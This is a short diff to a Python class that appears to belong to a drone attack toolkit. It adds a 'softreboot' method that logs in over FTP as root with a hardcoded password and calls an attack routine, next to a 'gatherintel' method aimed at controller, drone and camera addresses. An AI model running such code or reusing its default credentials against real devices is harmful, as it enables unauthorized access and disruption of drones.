@@ -96,6 +96,17 @@ class Environment:
             self.__closeftp()
             
             
+    def softreboot(self, ip='192.168.1.1', user='root', password='Big~9China'):
+        
+        try:
+            self.__openftp(ip, user, password)
+            attacks.softreboot(self.ftp)
+        except Exception as e:
+            raise StandardError(str(e))
+        finally:
+            self.__closeftp()
+        
+                       
     def gatherintel(self, controllerip='192.168.1.1', droneip='192.168.1.2', cameraip='192.168.1.3'):
         
         hosts = [(controllerip, 'root', 'Big~9China', attacks.gatherintelcontroller),
